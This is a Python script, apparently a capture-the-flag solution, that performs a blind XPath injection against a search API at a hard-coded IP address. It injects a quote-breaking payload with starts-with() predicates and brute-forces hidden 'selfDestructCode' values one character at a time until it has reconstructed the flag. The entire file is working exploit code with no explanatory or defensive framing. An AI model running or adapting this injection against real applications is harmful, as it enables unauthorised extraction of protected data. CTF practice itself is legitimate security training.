import json
import string

import requests

if __name__ == "__main__":
    URL = "http://46.101.37.171:30990/api/search"
    HEADERS = {"Content-type": "application/json"}
    PRINTABLE = "_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&"

    flag_1 = "CHTB{Th3_3xTr4_l3v3l_"
    found = True

    while found:
        found = False
        for c in PRINTABLE:
            tmp_flag = flag_1 + c
            payload = f"'] | (/military/district[@id])[2]/staff/selfDestructCode[starts-with(text(), '{tmp_flag}')] | name['"
            data = json.dumps({"search": payload})
            req = requests.post(URL, data=data, headers=HEADERS)

            result = req.json()
            if "success" in result:
                flag_1 = tmp_flag
                print(flag_1)
                found = True
                break
    
    flag_2 = ""
    while not flag_2 or flag_2[-1] != "}":
        for c in PRINTABLE:
            tmp_flag = flag_2 + c
            payload = f"'] | (/military/district[@id])[3]/staff/selfDestructCode[starts-with(text(), '{tmp_flag}')] | name['"
            data = json.dumps({"search": payload})
            req = requests.post(URL, data=data, headers=HEADERS)

            result = req.json()
            if "success" in result:
                flag_2 = tmp_flag
                print(flag_2)
                break

    print(flag_1 + flag_2)
